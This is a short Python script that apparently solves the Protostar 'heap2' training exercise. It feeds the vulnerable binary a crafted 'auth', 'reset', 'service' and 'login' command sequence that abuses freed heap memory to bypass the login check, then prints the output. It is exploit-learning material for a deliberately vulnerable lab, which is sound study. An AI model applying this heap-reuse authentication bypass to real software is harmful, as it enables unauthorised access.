#!/usr/bin/env python
#-*- coding: utf-8 -*-

import subprocess

binary = '/opt/protostar/bin/heap2'

payload = 'auth a\n'
payload += 'reset\n'
payload += 'service ' + 'A' * 50 + '\n'
payload += 'login\n'

with open('payload', 'w') as fd1:
    fd1.write(payload)

fd2 = open('out', 'w')
cmd = binary 
print('[+] Command: {0}'.format(cmd))
p1 = subprocess.Popen(cmd, stdin=open('payload', 'r'), 
    stdout=fd2, stderr=fd2, shell=True)
print('[+] Output written in \"out\" file.')

p = subprocess.Popen('cat out', stdin=subprocess.PIPE, 
stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
res = p.communicate()[0]
print('[+] \'out\' file contents: ')
print(res)

